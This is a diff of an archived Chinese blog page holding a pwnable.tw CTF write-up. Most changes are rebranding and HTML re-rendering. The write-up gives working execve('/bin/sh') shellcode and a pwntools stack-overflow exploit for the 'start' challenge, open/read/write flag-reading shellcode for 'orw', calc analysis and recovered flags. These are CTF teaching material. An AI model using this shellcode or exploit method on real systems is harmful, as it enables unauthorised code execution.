@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 4.2.0">
+<meta name="generator" content="Hexo 6.3.0">
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
   <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
@@ -24,7 +24,7 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="【CTF题解-0x02】pwnable.tw write up by arttnba3">
 <meta property="og:url" content="http://archive.next.arttnba3.cn/2020/08/17/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x02%E3%80%91pwnable-tw-write-up-by-arttnb3/index.html">
-<meta property="og:site_name" content="arttnba3&#39;s blog">
+<meta property="og:site_name" content="arttnba3&#39;s old blog">
 <meta property="og:description" content="0x00.绪论pwnable.tw是一个世界范围内很有名的pwn题网站，作为主攻pwn的CTFer，上面的题对我而言自然是很有必要做的（当然我现在还太弱了XD 点开查看题解👇（当然也有可能我暂时还一题都没有做出来2333  注：原题皆可在本页面直接下载">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://i.loli.net/2020/08/17/fFU9jXJR4NlxuGB.png">
@@ -56,11 +56,11 @@
 <meta property="article:published_time" content="2020-08-17T13:19:29.000Z">
 <meta property="article:modified_time" content="2021-02-26T17:04:36.538Z">
 <meta property="article:author" content="arttnba3">
+<meta property="article:tag" content="python">
 <meta property="article:tag" content="信息安全">
 <meta property="article:tag" content="PWN">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="ret2shellcode">
-<meta property="article:tag" content="python">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://i.loli.net/2020/08/17/fFU9jXJR4NlxuGB.png">
 
@@ -77,7 +77,7 @@
   };
 </script>
 
-  <title>【CTF题解-0x02】pwnable.tw write up by arttnba3 | arttnba3's blog</title>
+  <title>【CTF题解-0x02】pwnable.tw write up by arttnba3 | arttnba3's old blog</title>
   
 
 
@@ -108,7 +108,7 @@
   </style>
 </noscript>
 
-<link rel="alternate" href="/atom.xml" title="arttnba3's blog" type="application/atom+xml">
+<link rel="alternate" href="/atom.xml" title="arttnba3's old blog" type="application/atom+xml">
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage">
@@ -129,10 +129,10 @@
 
     <a href="/" class="brand" rel="start">
       <span class="logo-line-before"><i></i></span>
-      <h1 class="site-title">arttnba3's blog</h1>
+      <h1 class="site-title">arttnba3's old blog</h1>
       <span class="logo-line-after"><i></i></span>
     </a>
-      <p class="site-subtitle" itemprop="description">- arttnba3的隐秘小窝 -</p>
+      <p class="site-subtitle" itemprop="description">- arttnba3的垃圾堆积处 -</p>
   </div>
 
   <div class="site-nav-right">
@@ -206,11 +206,11 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
       <meta itemprop="name" content="arttnba3">
-      <meta itemprop="description" content="- 做了关于你的梦，所以不愿醒来呢 -">
+      <meta itemprop="description" content="此页面已废弃，新博客: arttnba3.cn">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="arttnba3's blog">
+      <meta itemprop="name" content="arttnba3's old blog">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
@@ -261,12 +261,12 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="0x00-绪论"><a href="#0x00-绪论" class="headerlink" title="0x00.绪论"></a>0x00.绪论</h1><p><a href="https://pwnable.tw" target="_blank" rel="noopener">pwnable.tw</a>是一个世界范围内很有名的pwn题网站，作为主攻pwn的CTFer，上面的题对我而言自然是很有必要做的（当然我现在还太弱了XD</p>
+        <h1 id="0x00-绪论"><a href="#0x00-绪论" class="headerlink" title="0x00.绪论"></a>0x00.绪论</h1><p><a target="_blank" rel="noopener" href="https://pwnable.tw/">pwnable.tw</a>是一个世界范围内很有名的pwn题网站，作为主攻pwn的CTFer，上面的题对我而言自然是很有必要做的（当然我现在还太弱了XD</p>
 <p>点开查看题解👇（<del>当然也有可能我暂时还一题都没有做出来2333</del></p>
 <blockquote>
 <p>注：原题皆可在本页面直接下载</p>
 </blockquote>
-<a id="more"></a>
+<span id="more"></span>
 
 <h1 id="0x01-start"><a href="#0x01-start" class="headerlink" title="0x01.start"></a>0x01.start</h1><blockquote>
 <p> nc chall.pwnable.tw 10000</p>
@@ -282,31 +282,31 @@
 <p><strong>随后将0x3c传入dl寄存器中，3传入al寄存器中，之后<code>int 0x80</code>中断指令触发Linux系统调用，al寄存器的值作为参数，调用了0x80中断的系统函数<code>sys_read()</code>，将bl、dl、ecx的值作为参数传入，读入最大0x3c个字节</strong></p>
 <p>最后返回到<code>_exit</code>函数，退出程序</p>
 <blockquote>
-<p>参见：<a href="http://asm.sourceforge.net/syscall.html" target="_blank" rel="noopener">linux系统调用</a></p>
+<p>参见：<a target="_blank" rel="noopener" href="http://asm.sourceforge.net/syscall.html">linux系统调用</a></p>
 </blockquote>
 <p><img src="https://i.loli.net/2020/08/17/ylLunQ8gIZpUVY9.png" alt="image.png"></p>
-<p>那么在这个过程当中，<strong><code>esp与栈</code>的变化如下</strong>（字丑勿怪2333（图上应该是5次push，手快写错了XDDD</p>
+<p>那么在这个过程当中，**<code>esp与栈</code>的变化如下**（字丑勿怪2333（图上应该是5次push，手快写错了XDDD</p>
 <p><img src="https://i.loli.net/2020/08/17/lKcY7N8LV2fIB64.png" alt="image.png"></p>
 <p>通过使用中断的方式调用系统函数，我们不难猜的出这应该是一个纯汇编写的程序</p>
 <p>程序本身也没有其他多余的gadgets，在保护全关的情况下，我们可以考虑<strong>泄露esp的值，将shellcode输入到栈上，再控制程序跳转到栈上的shellcode以getshell</strong></p>
 <p>那么我们可以考虑先覆盖掉return address，控制其跳转至<code>0x8048087</code>，重新调用<code>sys_write()</code>输出栈上的内容，此时程序会将<code>原esp的值</code>输出出来</p>
 <p><img src="https://i.loli.net/2020/08/17/H6XJh48wE2bnMeT.png" alt="image.png"></p>
-<p>随后程序接着往下走，重新调用<code>sys_read()</code>，我们便可以在这里输入我们的第二段payload：<strong>20*’A’ + 通过泄露的esp的值计算出来的存放shellcode的栈地址 + shellcode</strong>，这段payload用以getshell</p>
+<p>随后程序接着往下走，重新调用<code>sys_read()</code>，我们便可以在这里输入我们的第二段payload：<em><em>20</em>‘A’ + 通过泄露的esp的值计算出来的存放shellcode的栈地址 + shellcode</em>*，这段payload用以getshell</p>
 <p><img src="https://i.loli.net/2020/08/17/H52G6MoufiUagpy.png" alt="image.png"></p>
 <p>简单分析我们可以知道经过第一次输入后的跳转再经过第二次输入后，栈上<code>原esp+0x14-4</code>的位置即是程序控制的返回地址，我们只需要在此处写上<code>原esp+0x14</code>，紧接着后面跟着覆盖上我们的shellcode即可getshell，整个过程如下图</p>
 <p><img src="https://i.loli.net/2020/08/17/PYJNSMt7j8VF3ob.png" alt="image.png"></p>
-<p>因为输入只有60个字节，故考虑使用11号中断调用execve(“/bin/sh”)来getshell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">;!c</span><br><span class="line">;execve (&quot;&#x2F;bin&#x2F;sh&quot;) </span><br><span class="line">xor ecx, ecx</span><br><span class="line">mul ecx</span><br><span class="line">push ecx</span><br><span class="line">push 0x68732f2f   ;; hs&#x2F;&#x2F;</span><br><span class="line">push 0x6e69622f   ;; nib&#x2F;</span><br><span class="line">mov ebx, esp</span><br><span class="line">mov al, 11</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
+<p>因为输入只有60个字节，故考虑使用11号中断调用execve(“&#x2F;bin&#x2F;sh”)来getshell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">;!c</span><br><span class="line">;execve (&quot;/bin/sh&quot;) </span><br><span class="line">xor ecx, ecx</span><br><span class="line">mul ecx</span><br><span class="line">push ecx</span><br><span class="line">push 0x68732f2f   ;; hs//</span><br><span class="line">push 0x6e69622f   ;; nib/</span><br><span class="line">mov ebx, esp</span><br><span class="line">mov al, 11</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
 <p>构造shellcode如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">&#x27;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#x27;</span></span><br></pre></td></tr></table></figure>
 
 <p>我们最后得到的exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">write_addr = <span class="number">0x8048087</span></span><br><span class="line">shellcode = <span class="string">'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./start'</span>)<span class="comment">#p = remote('chall.pwnable.tw',10000)</span></span><br><span class="line">payload1 = <span class="string">'A'</span>*<span class="number">0x14</span> + p32(write_addr)</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">esp_value = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">payload2 = <span class="string">'A'</span>*<span class="number">0x14</span> + p32(esp_value+<span class="number">0x14</span>) + shellcode<span class="comment">#本地不明原因一直跑不通x</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">write_addr = <span class="number">0x8048087</span></span><br><span class="line">shellcode = <span class="string">&#x27;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./start&#x27;</span>)<span class="comment">#p = remote(&#x27;chall.pwnable.tw&#x27;,10000)</span></span><br><span class="line">payload1 = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x14</span> + p32(write_addr)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">esp_value = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">payload2 = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x14</span> + p32(esp_value+<span class="number">0x14</span>) + shellcode<span class="comment">#本地不明原因一直跑不通x</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>连接，发送我们的payload，成功得到flag（👈因为网不好连着试了好几次才成功…</p>
 <p><img src="https://i.loli.net/2020/08/18/rY8vSGaO2R7Zu1W.png" alt="image.png"></p>
 <p>得到flag：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;Pwn4bl3_tW_1s_y0ur_st4rt&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;Pwn4bl3_tW_1s_y0ur_st4rt&#125;</span><br></pre></td></tr></table></figure>
 
 <h1 id="0x02-orw"><a href="#0x02-orw" class="headerlink" title="0x02.orw"></a>0x02.orw</h1><blockquote>
 <p>nc chall.pwnable.tw 10001</p>
@@ -328,12 +328,12 @@
 <p>结合题目说明，我们<strong>仅考虑构造shellcode来cat flag</strong></p>
 <p>（因为要绕过seccomp来getshell已经是kernel pwn 的级别le，233333）</p>
 <p>故构造exp如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">shellcode &#x3D; &quot;&quot;</span><br><span class="line">shellcode +&#x3D; shellcraft.i386.pushstr(&quot;&#x2F;home&#x2F;orw&#x2F;flag&quot;)</span><br><span class="line">shellcode +&#x3D; shellcraft.i386.linux.syscall(&quot;SYS_open&quot;, &#39;esp&#39;)</span><br><span class="line">shellcode +&#x3D; shellcraft.i386.linux.syscall(&quot;SYS_read&quot;, &#39;eax&#39;, &#39;esp&#39;, 0x30)</span><br><span class="line">shellcode +&#x3D; shellcraft.i386.linux.syscall(&quot;SYS_write&quot;, 1, &#39;esp&#39;, 0x30)</span><br><span class="line">p &#x3D; remote(&#39;chall.pwnable.tw&#39;,10001)</span><br><span class="line">p.sendline(asm(shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">shellcode = &quot;&quot;</span><br><span class="line">shellcode += shellcraft.i386.pushstr(&quot;/home/orw/flag&quot;)</span><br><span class="line">shellcode += shellcraft.i386.linux.syscall(&quot;SYS_open&quot;, &#x27;esp&#x27;)</span><br><span class="line">shellcode += shellcraft.i386.linux.syscall(&quot;SYS_read&quot;, &#x27;eax&#x27;, &#x27;esp&#x27;, 0x30)</span><br><span class="line">shellcode += shellcraft.i386.linux.syscall(&quot;SYS_write&quot;, 1, &#x27;esp&#x27;, 0x30)</span><br><span class="line">p = remote(&#x27;chall.pwnable.tw&#x27;,10001)</span><br><span class="line">p.sendline(asm(shellcode))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>向服务器发送我们的payload</p>
 <p><img src="https://i.loli.net/2020/08/31/m6YRSEpJFk9wQCb.png" alt="_7__O90_E_I39_HGTFIP__S.png"></p>
 <p>成功得到flag</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;sh3llc0ding_w1th_op3n_r34d_writ3&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;sh3llc0ding_w1th_op3n_r34d_writ3&#125;</span><br></pre></td></tr></table></figure>
 
 <h1 id="0x03-CVE-2018-1160（×）"><a href="#0x03-CVE-2018-1160（×）" class="headerlink" title="0x03.CVE-2018-1160（×）"></a>0x03.CVE-2018-1160（×）</h1><blockquote>
 <p>nc chall.pwnable.tw 10002</p>
@@ -342,8 +342,8 @@
 <p><a href="/download/pwnabletw/CVE-2018-1160/libc.so" title="点击此处下载原题">点击下载-libc.so</a> </p>
 <blockquote>
 <p>首先我们先看看CVE是个啥：</p>
-<p> CVE 的英文全称是“Common Vulnerabilities &amp; Exposures”通用漏洞披露。CVE就好像是一个字典表，为广泛认同的<a href="https://baike.baidu.com/item/信息安全/339810" target="_blank" rel="noopener">信息安全</a>漏洞或者已经暴露出来的弱点给出一个公共的<a href="https://baike.baidu.com/item/名称/6546057" target="_blank" rel="noopener">名称</a>。使用一个共同的名字，可以帮助用户在各自独立的各种漏洞数据库中和漏洞评估<a href="https://baike.baidu.com/item/工具/81891" target="_blank" rel="noopener">工具</a>中共享数据，虽然这些工具很难整合在一起。这样就使得CVE成为了安全信息共享的“<a href="https://baike.baidu.com/item/关键字/7105697" target="_blank" rel="noopener">关键字</a>”。如果在一个漏洞报告中<a href="https://baike.baidu.com/item/指明/633104" target="_blank" rel="noopener">指明</a>的一个漏洞，如果有CVE名称，你就可以快速地在任何其它CVE兼容的数据库中找到相应修补的信息，解决安全<a href="https://baike.baidu.com/item/问题/1067365" target="_blank" rel="noopener">问题</a>。 </p>
-<p><a href="https://baike.baidu.com/item/CVE" target="_blank" rel="noopener">百度百科-CVE</a></p>
+<p> CVE 的英文全称是“Common Vulnerabilities &amp; Exposures”通用漏洞披露。CVE就好像是一个字典表，为广泛认同的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/339810">信息安全</a>漏洞或者已经暴露出来的弱点给出一个公共的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%90%8D%E7%A7%B0/6546057">名称</a>。使用一个共同的名字，可以帮助用户在各自独立的各种漏洞数据库中和漏洞评估<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%B7%A5%E5%85%B7/81891">工具</a>中共享数据，虽然这些工具很难整合在一起。这样就使得CVE成为了安全信息共享的“<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%85%B3%E9%94%AE%E5%AD%97/7105697">关键字</a>”。如果在一个漏洞报告中<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%8C%87%E6%98%8E/633104">指明</a>的一个漏洞，如果有CVE名称，你就可以快速地在任何其它CVE兼容的数据库中找到相应修补的信息，解决安全<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E9%97%AE%E9%A2%98/1067365">问题</a>。 </p>
+<p><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/CVE">百度百科-CVE</a></p>
 </blockquote>
 <p>好家伙，第三题直接上<strong>CVE</strong>，<del>我直接当场暴毙做不出来跳过并进入下一题</del></p>
 <p>惯例的<code>checksec</code>，<strong>保 护 全 开</strong>（噔 噔 咚）</p>
@@ -376,18 +376,18 @@
 <p><img src="https://i.loli.net/2020/09/01/Keb5UGoVu4628fS.png" alt="image.png"></p>
 <p>一开始<code>bzero()</code>将s上的100个字节置0，随后对a1上的字符（也就是先前读入的合法的表达式）逐字符进行判断</p>
 <p><img src="https://i.loli.net/2020/09/01/EC2X13BPOx9Lcme.png" alt="image.png"></p>
-<p>随后，<strong>首先判断是否为+-*/%</strong>等运算符号，因为强制类型转换将a1+i上的值转为<strong>unsigned int</strong>，若是’0’~’9’则肯定会≤9，<strong>若是运算符号，其减去48所得的值小于0，强制类型转换变成unsigned int后会变成一个极大的正整数（必定大于9）</strong></p>
+<p>随后，<strong>首先判断是否为+-*&#x2F;%<strong>等运算符号，因为强制类型转换将a1+i上的值转为</strong>unsigned int</strong>，若是’0’~’9’则肯定会≤9，<strong>若是运算符号，其减去48所得的值小于0，强制类型转换变成unsigned int后会变成一个极大的正整数（必定大于9）</strong></p>
 <blockquote>
 <p>注：这个语句我曾经一直以为是废语句Or2</p>
 </blockquote>
 <p><img src="https://i.loli.net/2020/09/01/vb3EIsGjnUu2xOp.png" alt="image.png"></p>
 <p>随后将该字符前面的<code>i+a1-v5</code>个字符（v5用作可移动索引）用memcpy拷贝至s1中，末尾置’\0’成为字符串，并判断s1是否为”0”，若为0则退出运算</p>
 <p><img src="https://i.loli.net/2020/09/01/Foe2MG9vdKczHY4.png" alt="image.png"></p>
-<p>随后使用atoi将s1转为整数存入v9中，若v9不为0，则将<em>a2[0]+1赋给v4，随后将v9赋给a2[v4+1]，由此我们可以知道*</em>a[0]保存的是已经储存的数字的个数**</p>
+<p>随后使用atoi将s1转为整数存入v9中，若v9不为0，则将<em>a2[0]+1赋给v4，随后将v9赋给a2[v4+1]，由此我们可以知道*<em>a[0]保存的是已经储存的数字的个数</em></em></p>
 <p>接下来判断我们先前判断的那一个运算符字符的下一个字符是否存在且是否不为运算符（即是否会出现++这样的情况），若是则直接退出运算</p>
 <p><img src="https://i.loli.net/2020/09/01/9jGflRnkt2e67JL.png" alt="image.png"></p>
 <p>接下来首先判断s[v7]是否为0，为0则将运算符存入s[v7]中，由此我们可以知道字符数组s是专门用来储存操作符的</p>
-<p>若s[v7]不为0（即代表先前已经储存了操作符），则分情况判断，若a1+i上的操作符为*/%则对s[v7]进行判断，判断其是否为+或-，由此我们可以看出这应该是一个针对运算符优先级的判断</p>
+<p>若s[v7]不为0（即代表先前已经储存了操作符），则分情况判断，若a1+i上的操作符为*&#x2F;%则对s[v7]进行判断，判断其是否为+或-，由此我们可以看出这应该是一个针对运算符优先级的判断</p>
 <p>若s[v7]的优先级低于a1+i，则进入eval函数，之后将a1+i上的操作符赋给s[v7]，eval传入的参数为a2与s[v7]，同时我们知道a2数组中储存的是需要被我们运算的数</p>
 <p>优先级相同且都为高优先级则将操作符再压入栈中，随后回到循环开头</p>
 <p>a1+i为低优先级（加与减）时则进入eval函数，先对s[v7]进行运算，之后s[v7]出栈再将a1+i入栈</p>
@@ -433,11 +433,11 @@
 
       <footer class="post-footer">
           <div class="post-tags">
+              <a href="/tags/python/" rel="tag"># python</a>
               <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" rel="tag"># 信息安全</a>
               <a href="/tags/PWN/" rel="tag"># PWN</a>
               <a href="/tags/CTF/" rel="tag"># CTF</a>
               <a href="/tags/ret2shellcode/" rel="tag"># ret2shellcode</a>
-              <a href="/tags/python/" rel="tag"># python</a>
           </div>
 
         
@@ -512,7 +512,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-绪论"><span class="nav-number">1.</span> <span class="nav-text">0x00.绪论</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-start"><span class="nav-number">2.</span> <span class="nav-text">0x01.start</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-orw"><span class="nav-number">3.</span> <span class="nav-text">0x02.orw</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-CVE-2018-1160（×）"><span class="nav-number">4.</span> <span class="nav-text">0x03.CVE-2018-1160（×）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-calc"><span class="nav-number">5.</span> <span class="nav-text">0x04.calc</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-%E7%BB%AA%E8%AE%BA"><span class="nav-number">1.</span> <span class="nav-text">0x00.绪论</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-start"><span class="nav-number">2.</span> <span class="nav-text">0x01.start</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-orw"><span class="nav-number">3.</span> <span class="nav-text">0x02.orw</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-CVE-2018-1160%EF%BC%88%C3%97%EF%BC%89"><span class="nav-number">4.</span> <span class="nav-text">0x03.CVE-2018-1160（×）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-calc"><span class="nav-number">5.</span> <span class="nav-text">0x04.calc</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -521,14 +521,14 @@
     <img class="site-author-image" itemprop="image" alt="arttnba3"
       src="/images/avatar.png">
   <p class="site-author-name" itemprop="name">arttnba3</p>
-  <div class="site-description" itemprop="description">- 做了关于你的梦，所以不愿醒来呢 -</div>
+  <div class="site-description" itemprop="description">此页面已废弃，新博客: arttnba3.cn</div>
 </div>
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">25</span>
+          <span class="site-state-item-count">26</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -613,7 +613,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2021</span>
+  <span itemprop="copyrightYear">2023</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
